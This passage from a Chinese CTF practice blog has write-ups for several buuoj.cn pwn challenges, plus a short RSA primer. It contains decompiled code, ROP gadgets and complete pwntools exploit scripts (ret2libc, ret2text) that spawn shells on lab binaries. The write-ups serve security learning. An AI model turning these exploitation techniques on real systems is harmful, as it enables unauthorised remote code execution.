begin("%d");  }  puts("Something Wrong!");  return 0;}</code></pre><pre class=" language-lang-c"><code class="language-lang-c">int begin(){  puts("====================================================================");  puts("1.Encrypt");  puts("2.Decrypt");  puts("3.Exit");  return puts("Input your choice!");}</code></pre><pre class=" language-lang-c"><code class="language-lang-c">int encrypt(){  size_t v0; // rbx  char s[48]; // [rsp+0h] [rbp-50h]  __int16 v3; // [rsp+30h] [rbp-20h]  memset(s, 0, sizeof(s));  v3 = 0;  puts("Input your Plaintext to be encrypted");  gets(s);  while ( 1 )  {    v0 = (unsigned int)x;    if ( v0 >= strlen(s) )      break;    if ( s[x] <= 96 || s[x] > 122 )    {      if ( s[x] <= 64 || s[x] > 90 )      {        if ( s[x] > 47 && s[x] <= 57 )          s[x] ^= 0xFu;      }      else      {        s[x] ^= 0xEu;      }    }    else    {      s[x] ^= 0xDu;    }    ++x;  }  puts("Ciphertext");  return puts(s);}</code></pre><p>简单测试过程序之后我们会发现，程序提供了两个功能：</p><ol><li>Encrypt()函数</li><li>Decrypt()没鸟用函数</li></ol><p>而我们发现在encrypt()函数中出现了我们最喜欢的gets()函数，那么漏洞点就来了，我们可以通过手算（0x50）+(0x8)​计算出来偏移量为88，也可以用peda来算，问题都不大</p><p>算出来偏移后我们就可以干我们想干的事情了，由于程序里没有给出system函数，因此我们就需要自己来泄露libc来获取shell了</p><p>如何获取libc版本呢，这可真令人头大，我们在仔细看一下</p><p>程序是64位的程序，参数不放在栈上，而是放在寄存器中，因此我们还要使用ROPgadget来找一个pop_rdi</p><pre class=" language-lang-txt"><code class="language-lang-txt">Gadgets information============================================================0x0000000000400c7c : pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret0x0000000000400c7e : pop r13 ; pop r14 ; pop r15 ; ret0x0000000000400c80 : pop r14 ; pop r15 ; ret0x0000000000400c82 : pop r15 ; ret0x0000000000400c7b : pop rbp ; pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret0x0000000000400c7f : pop rbp ; pop r14 ; pop r15 ; ret0x00000000004007f0 : pop rbp ; ret0x0000000000400aec : pop rbx ; pop rbp ; ret0x0000000000400c83 : pop rdi ; ret  <-------pop_rdi找到了0x0000000000400c81 : pop rsi ; pop r15 ; ret0x0000000000400c7d : pop rsp ; pop r13 ; pop r14 ; pop r15 ; ret0x00000000004006b9 : ret0x00000000004008ca : ret 0x20170x0000000000400962 : ret 0x458b0x00000000004009c5 : ret 0xbf02</code></pre><p>根据我在 <a href="http://cdusec.happyhacking.top/?post=127" target="_blank" rel="noopener">http://cdusec.happyhacking.top/?post=127</a> 介绍的知识，（不同的是这个程序是64位的，因此payload要变一下）</p><pre class=" language-lang-txt"><code class="language-lang-txt">payload1='a'*offset + pop_rdi_addr + elf.plt['puts'] + elf.got['puts']+ retaddr</code></pre><p>泄露puts函数真实地址来确定libc版本</p><pre class=" language-lang-python"><code class="language-lang-python">#/usr/bin/env python#-*-coding:utf-8-*-from pwn import *from LibcSearcher import *def choose(index):    sh.recvuntil("Input your choice!\n")    sh.sendline(str(index))def link_libc(payload):    sh.recvuntil("Input your Plaintext to be encrypted\n")       sh.sendline(payload)def pwn(ip,port,debug):    global sh    if debug==1:        sh = process('./ciscn_2019_c_1')        elf = ELF('./ciscn_2019_c_1')        context.log_level = 'debug'    else:        sh=remote(ip,port)    rdi_addr = 0x0000000000400c83    ret_addr=0x4009A0    puts_plt = elf.plt['puts']    puts_got = elf.got['puts']    sh.sendlineafter('choice!\n', '1')    payload1 = 'a' * 88 + p64(rdi_addr) + p64(puts_got) + p64(puts_plt) + p64(ret_addr)    link_libc(payload1)    sh.recvuntil('@')    sh.recvline()    puts_leak = u64(sh.recvline()[:-1].ljust(8,'\x00'))    log.success('puts_leak_addr => {}'.format(hex(puts_leak)))if __name__ == '__main__':    pwn(0,0,1)</code></pre><p>执行完以后：</p><pre class=" language-lang-txt"><code class="language-lang-txt">[+] puts_leak_addr => 0x7f558db9e690</code></pre><p>我们就已经泄露出puts的真实地址了</p><blockquote><p>知识点：</p><ol><li><p>Linux的程序中使用了延迟绑定机制，也就是说一个函数在没有执行前，你是不知道它的真实地址是什么的</p></li><li><p>system 函数属于 libc，而 libc.so 动态链接库中的函数之间相对偏移是固定的。</p></li><li><p>即使程序有 ASLR 保护，也只是针对于地址中间位进行随机，最低的 12 位并不会发生改变</p></li></ol></blockquote><p>然后就是正常的ret2libc操作了：关于libcseacher的使用方法就不过多介绍了</p><p>完整exp:</p><pre class=" language-lang-python"><code class="language-lang-python">#/usr/bin/env python#-*-coding:utf-8-*-from pwn import *from LibcSearcher import *def choose(index):    sh.recvuntil("Input your choice!\n")    sh.sendline(str(index))def link_libc(payload):    sh.recvuntil("Input your Plaintext to be encrypted\n")       sh.sendline(payload)def pwn(ip,port,debug):    global sh    if debug==1:        sh = process('./ciscn_2019_c_1')        elf = ELF('./ciscn_2019_c_1')        context.log_level = 'debug'    else:        sh=remote(ip,port)    rdi_addr = 0x0000000000400c83    ret_addr=0x4009A0 #跳转到encrypt()    puts_plt = elf.plt['puts']    puts_got = elf.got['puts']    choose(1)    payload1 = 'a' * 88 + p64(rdi_addr) + p64(puts_got) + p64(puts_plt) + p64(ret_addr)    link_libc(payload1)    #读到\n后在读取一行就是我们想要的东西    sh.recvuntil('\n')    sh.recvline()    puts_leak = u64(sh.recvline()[:-1].ljust(8,'\x00'))    log.success('puts_leak_addr => {}'.format(hex(puts_leak)))    libc = LibcSearcher('puts', puts_leak)    libc_base = puts_leak - libc.dump('puts')    sys_addr = libc_base + libc.dump('system')    bin_sh_addr = libc_base + libc.dump('str_bin_sh')    payload2 = 'a' * 88 + p64(rdi_addr) + p64(bin_sh_addr) + p64(sys_addr)    sh.sendline(payload2)    sh.interactive()if __name__ == '__main__':    pwn(0,0,1)</code></pre><p>这个脚本在Ubuntu16.04中可以取得shell,但在18.04中，由于Ubuntu18运行机制与前面版本的不同，在调用system的时候需要进行栈对齐</p><p>因此Ubuntu18.04的payload为：</p><pre class=" language-lang-txt"><code class="language-lang-txt">ret = 0x4006b9payload_Ubuntu18 = '1'*0x58+p64(ret)+p64(pop_rdi)+p64(bin_sh)+p64(sys_addr)</code></pre><h2 id="0x30-OGeek2019-babyrop"><a href="#0x30-OGeek2019-babyrop" class="headerlink" title="0x30 [OGeek2019]babyrop"></a>0x30 [OGeek2019]babyrop</h2><p>题目来源：buuoj.cn</p><p>考点：绕过strncmp，rop,ret2libc,变量覆盖</p><p>难度：中等</p><p>file:</p><pre class=" language-lang-txt"><code class="language-lang-txt">pwn: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-, for GNU/Linux 2.6.32, BuildID[sha1]=6503b3ef34c8d55c8d3e861fb4de2110d0f9f8e2, stripped</code></pre><p>32位动态链接库文件</p><p>checksec</p><pre class=" language-lang-txt"><code class="language-lang-txt">    Arch:     i386-32-little    RELRO:    Full RELRO    Stack:    No canary found    NX:       NX enabled    PIE:      No PIE (0x8048000)</code></pre><p>程序开启了NX，RELRO，意味着不能修改GOT表了</p><p>ida 反汇编主要函数</p><pre class=" language-lang-c"><code class="language-lang-c">int __cdecl main(){  int buf; // [esp+4h] [ebp-14h]  char v2; // [esp+Bh] [ebp-Dh]  int fd; // [esp+Ch] [ebp-Ch]  sub_80486BB();  fd = open("/dev/urandom", 0);#生成随机数  if ( fd > 0 )    read(fd, &buf, 4u);  v2 = sub_804871F(buf);#比较随机数  sub_80487D0(v2);  return 0;}</code></pre><pre class=" language-lang-c"><code class="language-lang-c">ssize_t __cdecl sub_80487D0(char a1){  ssize_t result; // eax  char buf; // [esp+11h] [ebp-E7h]  if ( a1 == 127 )    result = read(0, &buf, 0xC8u);  else    result = read(0, &buf, a1);  return result;}</code></pre><pre class=" language-lang-c"><code class="language-lang-c">int __cdecl sub_804871F(int a1){  size_t v1; // eax  char s; // [esp+Ch] [ebp-4Ch]  char buf[7]; // [esp+2Ch] [ebp-2Ch]  unsigned __int8 v5; // [esp+33h] [ebp-25h]  ssize_t v6; // [esp+4Ch] [ebp-Ch]  memset(&s, 0, 0x20u);  memset(buf, 0, 0x20u);  sprintf(&s, "%ld", a1);#生成的随机数读取到s中  v6 = read(0, buf, 0x20u);#用户输入  buf[v6 - 1] = 0;  v1 = strlen(buf);  if ( strncmp(buf, &s, v1) )    exit(0);  write(1, "Correct\n", 8u);  return v5;}</code></pre><p>程序主要有三个函数，分析一下程序流程：</p><p>读取一个随机数，然后与用户输入作比较，需要绕过。<strong>strlen</strong>遇到\x00会停止，因此只要开头为\x00，最终比较的长度v1就是0，从而绕过strncmp</p><p>这里read的第三个读取长度参数实际上是前一个函数的返回值(v5)，可以通过上一次输入覆盖为\xff，然后就可以利用栈溢出进行常规ROP了。</p><p>我们来验证一下</p><pre class=" language-lang-python"><code class="language-lang-python">#usr/bin/env python#-*-coding:utf-8-*-from pwn import *libc=ELF("./libc-2.23.so")elf=ELF("./pwn")def pwn(ip,port,debug):    if debug==1:        io=process("./pwn")        context.log_level="debug"    else:        io=remote(ip,port)    payload='\x00'+'\xff'    io.sendline(payload)    io.interactive()if __name__ == '__main__':    pwn(0,0,1)</code></pre><p>运行输出Correct</p><p>绕过了随机数后我们还需要将v5覆盖的大一点来方便我们溢出，而v5距离buf(即我们的输入)的距离为：（0x2c-0x25）=7,因此根据我们以前做题的经验构造payload覆盖v5为 <code>\xff</code> </p><p>因此我们的payload1：</p><pre class=" language-lang-txt"><code class="language-lang-txt">payload1='\x00'+'a'*6+'\xff'</code></pre><p>覆盖成功，接下来就是正常的一个read()溢出漏洞了,由于程序只给了write函数，我们就只能使用write函数来泄露了</p><p>最终exp:</p><pre class=" language-lang-python"><code class="language-lang-python">#usr/bin/env python#-*-coding:utf-8-*-from pwn import *libc=ELF("./libc-2.23.so")elf=ELF("./pwn")system_libc=libc.symbols['system']binsh_libc=libc.search('/bin/sh').next()write_libc=libc.symbols['write']write_plt=elf.plt['write']write_got=elf.got['write']main_addr=0x08048825def pwn(ip,port,debug):    if debug==1:        #io=process("./pwn")        io = process('./pwn',env={"LD_PRELOAD":"./libc-2.23.so"})        context.log_level="debug"    else:        io=remote(ip,port)    #0x2c-0x25=7    payload1='\x00'+'a'*6+'\xff'    io.sendline(payload1)    io.recvuntil('Correct\n')    #get read.got addr    #32位程序offset一般为ebp+4=0xe7+0x4    #payload='a'*offset+ write.plt+ retaddr +p32(0)+ write.got +p32(0)    #泄露write的got地址    payload='a'*0xe7+'b'*0x4    payload+=p32(write_plt)+p32(main_addr)    #    write.plt +  retaddr    payload+=p32(1)+p32(write_got)+p32(0x8)    #      write(1,wirte_got,8u)    io.sendline(payload)    write_addr=u32(io.recv()[0:4])    log.success('write_leak_addr => {}'.format(hex(write_addr)))    libc_base=write_addr-write_libc    system_addr=libc_base+ system_libc    binsh_addr=binsh_libc+libc_base    log.success('libc_leak_addr => {}'.format(hex(libc_base)))    log.success('system_leak_addr => {}'.format(hex(system_addr)))    log.success('binsh_leak_addr => {}'.format(hex(binsh_addr)))    io.sendline(payload1)    io.recvuntil('Correct\n')    payload='a'*(0xe7+0x4) + p32(system_addr)+ 'bbbb' + p32(binsh_addr)    io.sendline(payload)    io.interactive()if __name__ == '__main__':    pwn("node3.buuoj.cn",27873,1)</code></pre><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ctf </tag>
            
            <tag> pwn </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>pwn练习-Day02</title>
      <link href="/2020/03/15/ctf/pwn/day02/"/>
      <url>/2020/03/15/ctf/pwn/day02/</url>
      
        <content type="html"><![CDATA[<h1 id="Day02"><a href="#Day02" class="headerlink" title="Day02"></a>Day02</h1><h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><p>今天的这两道题同样很水，因此我决定加道入门的RSA玩玩，主要是堆学不动了，歇一歇 :smile_cat:</p><h2 id="0x10-pwn1-sctf-2016"><a href="#0x10-pwn1-sctf-2016" class="headerlink" title="0x10 pwn1_sctf_2016"></a>0x10 pwn1_sctf_2016</h2><p>题目来源 buuoj.cn</p><p>题目考点：经典栈溢出算偏移</p><p>题目难度：入门</p><p>file</p><pre class=" language-lang-txt"><code class="language-lang-txt">pwn1_sctf_2016: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-, for GNU/Linux 2.6.24, BuildID[sha1]=4b1df4d30f1d6b75666c64bed078473a4ad8e799, not stripped</code></pre><p>32位，动态链接库文件</p><p>checksec</p><pre class=" language-lang-txt"><code class="language-lang-txt">    Arch:     i386-32-little    RELRO:    Partial RELRO    Stack:    No canary found    NX:       NX enabled    PIE:      No PIE (0x8048000)</code></pre><p>程序没有开启栈保护，开启了NX（栈数据不可执行）</p><p>ida 反汇编主要函数</p><pre class=" language-lang-txt"><code class="language-lang-txt">int vuln(){  int v0; // ST08_4@1  const char *v1; // eax@1  char s; // [sp+1Ch] [bp-3Ch]@1  char v4; // [sp+3Ch] [bp-1Ch]@1  char v5; // [sp+40h] [bp-18h]@1  char v6; // [sp+47h] [bp-11h]@1  char v7; // [sp+48h] [bp-10h]@1  char v8; // [sp+4Fh] [bp-9h]@1  printf("Tell me something about yourself: ");  fgets(&s, 32, edata);  std::string::operator=(&input, &s);  std::allocator<char>::allocator(&v6);  std::string::string(&v5, "you", &v6);  std::allocator<char>::allocator(&v8);  std::string::string(&v7, "I", &v8);  replace(&v4, &input, &v7);  std::string::operator=(&input, &v4, v0, &v5);  std::string::~string(&v4);  std::string::~string(&v7);  std::allocator<char>::~allocator(&v8);  std::string::~string(&v5);  std::allocator<char>::~allocator(&v6);  v1 = std::string::c_str(&input);  strcpy(&s, v1);  return printf("So, %s\n", &s);}</code></pre><pre class=" language-lang-txt"><code class="language-lang-txt">std::string *__stdcall replace(std::string *a1, std::string *a2, std::string *a3){  int v4; // [sp+Ch] [bp-4Ch]@0  char v5; // [sp+10h] [bp-48h]@2  char v6; // [sp+14h] [bp-44h]@2  char v7; // [sp+1Bh] [bp-3Dh]@2  int v8; // [sp+1Ch] [bp-3Ch]@2  char v9; // [sp+20h] [bp-38h]@2  int v10; // [sp+24h] [bp-34h]@2  int v11; // [sp+28h] [bp-30h]@2  char v12; // [sp+2Fh] [bp-29h]@2  int v13; // [sp+30h] [bp-28h]@2  int v14; // [sp+34h] [bp-24h]@2  char v15; // [sp+38h] [bp-20h]@2  int v16; // [sp+3Ch] [bp-1Ch]@2  char v17; // [sp+40h] [bp-18h]@2  int v18; // [sp+44h] [bp-14h]@2  char v19; // [sp+48h] [bp-10h]@2  char v20; // [sp+4Ch] [bp-Ch]@2  while ( std::string::find(a2, a3, 0) != -1 )  {    std::allocator<char>::allocator(&v7);    v8 = std::string::find(a2, a3, 0);    std::string::begin(&v9);    __gnu_cxx::__normal_iterator<char *,std::string>::operator+(&v10);    std::string::begin(&v11);    std::string::string<__gnu_cxx::__normal_iterator<char *,std::string>>(&v6, v11, v10, &v7);    std::allocator<char>::~allocator(&v7);    std::allocator<char>::allocator(&v12);    std::string::end(&v13);    v14 = std::string::length(a3);    v16 = std::string::find(a2, a3, 0);    std::string::begin(&v17);    __gnu_cxx::__normal_iterator<char *,std::string>::operator+(&v15);    __gnu_cxx::__normal_iterator<char *,std::string>::operator+(&v18);    std::string::string<__gnu_cxx::__normal_iterator<char *,std::string>>(&v5, v18, v13, &v12);    std::allocator<char>::~allocator(&v12);    std::operator+<char,std::char_traits<char>,std::allocator<char>>(&v20);    std::operator+<char,std::char_traits<char>,std::allocator<char>>(&v19);    std::string::operator=(a2, &v19, &v5, v4);    std::string::~string(&v19);    std::string::~string(&v20);    std::string::~string(&v5);    std::string::~string(&v6);  }  std::string::string(a1, a2);  return a1;}</code></pre><pre class=" language-lang-txt"><code class="language-lang-txt">int get_flag(){  return system("cat flag.txt");}</code></pre><p>题目分析：</p><ol><li>应该是C++程序，不过关系不大</li><li>程序提供了replace() 函数</li><li>程序提供后门 get_flag</li><li>在vuln()函数中调用了replace()功能，主要是把字符 <code>I</code> 替换成 <code>you</code> , 且程序最后会将替换后的字符串重新写入 <code>s</code> 这就造成了栈溢出</li></ol><p>利用思路：</p><p>通过ida我们可以知道：<code>s</code> 距离<code>ebp</code>的距离为 <code>0x3c</code> ,程序为32位程序，因此需要的垃圾字符数量为 <code>0x3c+0x4</code></p><p>而我们最多输入32个字符，但程序会把所有的 <code>I</code> 替换成 <code>you</code> ,也就是说 输入一个 <code>I</code> 相当于3个字符，因此</p><pre class=" language-lang-txt"><code class="language-lang-txt">offset='I'*21 + 'f'# 21*3+1=0x3c+0x4=68</code></pre><p>exp:</p><pre class=" language-lang-python"><code class="language-lang-python">#usr/bin/env python#-*-coding:utf-8-*-from pwn import *#io=process("./pwn1_sctf_2016")io=remote("node3.buuoj.cn",27767)sys_addr=0x08048F0Dpayload=flat(["I" * 21,"1",p32(sys_addr)])io.sendline(payload)io.interactive()</code></pre><h2 id="0x20-ciscn-2019-n-1"><a href="#0x20-ciscn-2019-n-1" class="headerlink" title="0x20 ciscn_2019_n_1"></a>0x20 ciscn_2019_n_1</h2><p>题目来源 buuoj.cn</p><p>题目考点：经典栈溢出覆盖局部变量</p><p>题目难度：入门</p><p>file:</p><pre class=" language-lang-txt"><code class="language-lang-txt">ciscn_2019_n_1: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/l, for GNU/Linux 2.6.32, BuildID[sha1]=8a733f5404b1e2c65e1758c7d92821eb8490f7c5, not stripped</code></pre><p>64位动态链接库文件</p><p>checksec</p><pre class=" language-lang-txt"><code class="language-lang-txt">    Arch:     amd64-64-little    RELRO:    Partial RELRO    Stack:    No canary found    NX:       NX enabled    PIE:      No PIE (0x400000)</code></pre><p>开启NX，栈数据不可执行</p><p>ida 反汇编主要函数</p><pre class=" language-lang-txt"><code class="language-lang-txt">int func(){  int result; // eax@2  char v1; // [sp+0h] [bp-30h]@1  float v2; // [sp+2Ch] [bp-4h]@1  v2 = 0.0;  puts("Let's guess the number.");  gets(&v1);  if ( v2 == 11.28125 )    result = system("cat /flag");  else    result = puts("Its value should be 11.28125");  return result;}</code></pre><p>可以看出：</p><ol><li>程序提供了后门</li><li>只要让v2==11.28125就行了</li></ol><p>故exp:</p><pre class=" language-lang-python"><code class="language-lang-python">#/usr/bin/env python#-*-coding:utf-8-*-from pwn import *context.log_level='debug'io=process('./ciscn_2019_n_1')payload=flat(['a'*(0x30-0x4),p64(0x41348000)]) #0x41348000==11.28125io.recvuntil("Let's guess the number.\n")io.sendline(payload)io.interactive()</code></pre><p>考点分析：</p><ol><li>通过栈溢出覆盖局部变量，来修改程序的值来达到修改程序运行结果的目的</li></ol><h2 id="0x30-RSA"><a href="#0x30-RSA" class="headerlink" title="0x30 RSA"></a>0x30 RSA</h2><h3 id="0x00-前言-1"><a href="#0x00-前言-1" class="headerlink" title="0x00 前言"></a>0x00 前言</h3><p>RSA简介部分节选自<a href="https://blog.csdn.net/huanghelouzi/article/details/82943615" target="_blank" rel="noopener">https://blog.csdn.net/huanghelouzi/article/details/82943615</a></p><h3 id="0x10-数学基础"><a href="#0x10-数学基础" class="headerlink" title="0x10 数学基础"></a>0x10 数学基础</h3><p>素数（质数）、合数、互质数</p><p><strong>素数：</strong></p><blockquote><p>一个数如果除了1与它本身之外没有其他的因数，那么这个数就被称为素数（或者质数，取自英文单词prime的首字母）</p></blockquote><p><strong>合数：</strong></p><blockquote><p>如果一个数大于1，且该数本身不是素数，那么这个数就是一个合数。</p></blockquote><p><strong>互质数：</strong></p><blockquote><p>如果两个整数$a,b$的最大公因数（greatest common divisor）为1，即$gcb(a,b)=1$，那么称a,b两数互质,。</p></blockquote><p><strong>模反元素</strong>：</p><blockquote><p>如果两个正整数$e$和$n$互质，那么一定可以找到整数$ d $，使得<code>e * (d -1)</code> 被${n}$整除，或者说<code>e * d</code> 被${n}$除的余数是1。这时，$d$就叫做$e$的“模反元素”。欧拉定理可以用来证明模反元素必然存在。两个整数$a,b$，它们除以整数$M$所得的余数相等：<code>a ≡ b  ( mod  m)</code>，比如说5除3余数为2，11除3余数也为2，于是可写成 <code>11 ≡ 5 ( mod  3)</code> </p></blockquote><h3 id="0x20-RSA简介"><a href="#0x20-RSA简介" class="headerlink" title="0x20 RSA简介"></a>0x20 RSA简介</h3><blockquote><p>选择两个大的参数，计算出模数 $N = p * q$</p><p>计算欧拉函数 $φ = (p-1) * (q-1)$，然后选择一个$e(1&lt;e&lt;φ)$，并且$e$和$φ$互质</p><p>取$e$的模反数$d$，计算方法为:$e * d ≡ 1 \quad (\quad mod \quad φ)$ </p><p>对明文$m$进行加密：$c = pow(m, e, N)$,可以得到密文$c$</p><p>对密文$c$进行解密：$m = pow(c, d, N)$,可以得到明文$m$</p></blockquote><p>整理得出：</p><blockquote><p>$p$ 和 $q$：两个大的<code>质数</code>，是另一个参数$N$的的两个因子<br>$N$：大整数，可以称之为<code>模数</code><br>$e$ 和 $d$：互为无反数的两个指数<br>$c$ 和 $m$：密文和明文<br>$(N, e)$：公钥<br>$(N, d)$：私钥<br>$pow(x, y, z)$：效果等效$pow(x, y)1 % z$， 先计算$x$的$y$次方，如果存在另一个参数$z$，需要再对结果进行取模。<br>密钥长度：$n$以二进制表示的的位数，例如密钥长度为512代表$n$用二进制表示的长度为512bit<br>RSA安全性分析<br>对于RSA加密算法，公钥$(N, e)$为公钥，可以任意公开</p></blockquote><p>保障RSA的安全性:</p><blockquote><p>1.定期更换密钥<br>2.不同的用户不可以使用相同的模数N<br>3.$p$与$q$的差值要大，最好是差几个比特<br>4.$p-1$与$q-1$都应该有大的素因子，一般建议选择的两个大素数$p、q$使得$p=2p+1$和$q=2q+1$也是素数<br>5.$e$的选择不要太小<br>6.$d$的选择也是不可以太小，最好满足$d&gt;=n/4$</p></blockquote><h3 id="0x20-example1"><a href="#0x20-example1" class="headerlink" title="0x20 example1"></a>0x20 example1</h3><p>本题选自buuoj.cn crypto中得一道RSA</p><p>考点：已知 $p,q,e$ 求：$d$</p><p>难度：入门</p><p>题目：</p><blockquote><p>在一次RSA密钥对生成中，假设p=473398607161，q=4511491，e=17<br>求解出d作为flga提交</p></blockquote><p>破解RSA最直接（亦或是暴力）的方法就是分解整数N​，然后计算欧拉函数​φ(n)=(p-1) * (q-1),再通过:</p><script type="math/tex; mode=display">d  \quad * \quad e ≡ 1 \quad mod \quad φ(N)​</script><p>即可计算出 ​d​</p><p>而在本题中，我们已经知道了$p,q,e$  ,也就是说我们只需要通过$d  \quad * \quad e ≡ 1 \quad mod \quad φ(N)$ 就可以算出 d​</p><p>我们使用python来帮助我们计算</p><pre class=" language-lang-python"><code class="language-lang-python">#/usr/bin/env python#-*-coding:utf-8-*-import gmpy2import gmpy2# gmpy2.mpz(x)# 初始化一个大整数xp = gmpy2.mpz(473398607161)q = gmpy2.mpz(4511491)e = gmpy2.mpz(17)n = (p-1)*(q-1)#d = gmpy2.invert(e,n) # 求逆元，d * e = 1 mod nd = gmpy2.invert(e,n)print(d)</code></pre><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ctf </tag>
            
            <tag> pwn </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Pwn练习-Day01</title>
      <link href="/2020/03/13/ctf/pwn/day01/"/>
      <url>/2020/03/13/ctf/pwn/day01/</url>
      
        <content type="html"><![CDATA[<h1 id="Day01"><a href="#Day01" class="headerlink" title="Day01"></a>Day01</h1><h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><p>题目来源于 <a href="https://buuoj.cn/challenges" target="_blank" rel="noopener">https://buuoj.cn/challenges</a></p><p>按顺序做的，这两道题比较简单，就不做详细解析了，解法在我前几篇写的pwn基础中提到过都是ret2text的类型</p><h2 id="0x10-pwn1"><a href="#0x10-pwn1" class="headerlink" title="0x10 pwn1"></a>0x10 pwn1</h2><p>经典栈溢出</p><p>file</p><pre class=" language-lang-txt"><code class="language-lang-txt">pwn1: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/l, for GNU/Linux 3.2.0, BuildID[sha1]=1c72ddcad651c7f35bb655e0ddda5ecbf8d31999, not stripped</code></pre><p>64位文件 dynamically linked<br>动态链接库</p><p>checksec</p><pre class=" language-lang-txt"><code class="language-lang-txt">[*] '/home/f0und/buuoj/pwn/pwn1/pwn1'    Arch:     amd64-64-little    RELRO:    Partial RELRO    Stack:    No canary found    NX:       NX disabled    PIE:      No PIE (0x400000)    RWX:      Has RWX segments</code></pre><p>无保护，且程序提供了system函数</p><p>ida 反汇编查看</p><pre class=" language-lang-c"><code class="language-lang-c">int __cdecl main(int argc, const char **argv, const char **envp){  char s; // [sp+1h] [bp-Fh]@1  puts("please input");  gets(&s, argv);  puts(&s);  puts("ok,bye!!!");  return 0;}</code></pre><p>fun()</p><pre class=" language-lang-c"><code class="language-lang-c">int fun(){  return system("/bin/sh");}</code></pre><p>peda 算出offset为23</p><p>由此payload就明显了</p><pre class=" language-lang-txt"><code class="language-lang-txt">fun_addr=0x401186payload=flat(['a'*23,p64(fun_addr)])</code></pre><p>exp:</p><pre class=" language-lang-python"><code class="language-lang-python">#/usr/bin/env python#-*-coding:utf-8-*-from pwn import *context.log_level="debug"io=process("./pwn1")fun_addr=0x401186payload=flat(['a'*23,p64(fun_addr)])io.sendline(payload)io.interactive()</code></pre><p>而这个exp在本地跑是没有什么问题的</p><p>nc 连上去就会超时，一会思考一下</p><p>exp:</p><pre class=" language-lang-python"><code class="language-lang-python">#/usr/bin/env python#-*-coding:utf-8-*-from pwn import *context.log_level="debug"io=process("./pwn1")pop_ret_addr=0x401185fun_addr=0x401186payload=flat(['a'*23,p64(pop_ret_addr),p64(fun_addr)])io.sendline(payload)io.interactive()</code></pre><h2 id="0x20-warmup-csaw-2016"><a href="#0x20-warmup-csaw-2016" class="headerlink" title="0x20 warmup_csaw_2016"></a>0x20 warmup_csaw_2016</h2><p>file:</p><pre class=" language-lang-txt"><code class="language-lang-txt">warmup_csaw_2016: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/l, for GNU/Linux 2.6.24, BuildID[sha1]=7b7d75c51503566eb1203781298d9f0355a66bd3, stripped</code></pre><p>64位动态链接库文件</p><p>checksec:</p><pre class=" language-lang-txt"><code class="language-lang-txt">[*] '/home/f0und/buuoj/pwn/warmup_csaw_2016/warmup_csaw_2016'    Arch:     amd64-64-little    RELRO:    Partial RELRO    Stack:    No canary found    NX:       NX disabled    PIE:      No PIE (0x400000)    RWX:      Has RWX segments</code></pre><p>同样没得任何保护</p><p>ida 反汇编查看</p><pre class=" language-lang-txt"><code class="language-lang-txt">int __fastcall main(__int64 a1, char **a2, char **a3){  char s; // [sp+0h] [bp-80h]@1  char v5; // [sp+40h] [bp-40h]@1  write(1, "-Warm Up-\n", 0xAuLL);  write(1, "WOW:", 4uLL);  sprintf(&s, "%p\n", sub_40060D);  write(1, &s, 9uLL);  write(1, ">", 1uLL);  return gets(&v5, ">");}</code></pre><pre class=" language-lang-c"><code class="language-lang-c">int sub_40060D(){  return system("cat flag.txt");}</code></pre><p>emmm，比上一题还简单</p><p>直接exp:</p><pre class=" language-lang-python"><code class="language-lang-python">#/usr/bin/env python#-*-coding:utf-8-*-from pwn import *context.log_level="debug"io=remote("node3.buuoj.cn",29722)#io=process("./warmup_csaw_2016")sys_addr=0x40060dpayload=flat(['a'*72,p64(sys_addr)])io.sendline(payload)io.interactive()</code></pre><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ctf </tag>
            
            <tag> pwn </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>命题及其联结词</title>
      <link href="/2020/02/26/math/lisan-1-1-md/"/>
      <url>/2020/02/26/math/lisan-1-1-md/</url>
      
